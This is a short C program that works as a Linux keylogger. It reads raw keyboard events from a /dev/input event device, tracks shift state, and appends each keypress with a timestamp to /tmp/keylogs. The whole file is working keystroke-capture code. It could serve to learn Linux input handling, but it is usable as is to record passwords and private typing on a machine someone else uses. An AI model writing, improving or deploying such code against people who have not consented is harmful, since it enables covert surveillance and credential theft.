#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <time.h>
#include <errno.h>
#include "keycodes.h"

int main(int argc, char * argv[]){
        if (argc != 2){
            printf("Usage: %s <event-file>\n e.g. %s /dev/input/event7\n", argv[0], argv[0]);
            return 1;
        }
        int fd = open(argv[1], O_RDONLY, 0);
        FILE *logfile = fopen("/tmp/keylogs", "a"); //append mode
        if (!logfile){
            perror("fopen");
            return 1;
        }
        
        struct input_event ie;

        
        int shift_held = 0;

        while(1){         
            ssize_t result = read(fd, &ie, sizeof(ie));
            if (result != sizeof(ie)) {
                if (errno == EBADF) {
                    fprintf(stderr, "read: Bad file descriptor. Try running %s as root?\n", argv[0]);
                } else {
                    perror("read");
                }
                break;
            }
            
        if (ie.type != 1){
            continue; //ONLY CARE ABOUT EVENT KEYS
        }
        if (ie.code == 42 || ie.code == 54){
            if (ie.value ==1){
                shift_held =1;
            }
            if (ie.value == 0){
                shift_held = 0;
            }
            continue;
        }
        if (ie.value == 1){ //keydown only
            const char *key = shift_held ? keycode_to_str_shifted(ie.code) //defined in keycodes.c
                                    : keycode_to_str(ie.code);
        
            //printf("%s\n", key);

            time_t t = ie.time.tv_sec;
            struct tm *tm_info = localtime(&t);
            char timebuf[32];
            strftime(timebuf, sizeof(timebuf), "%Y-%m-%d %H:%M:%S", tm_info);

            fprintf(logfile, "[%s] %s\n", timebuf, key);
            fflush(logfile);
        }
    }
    close(fd);
    fclose(logfile);
    return 0;
}
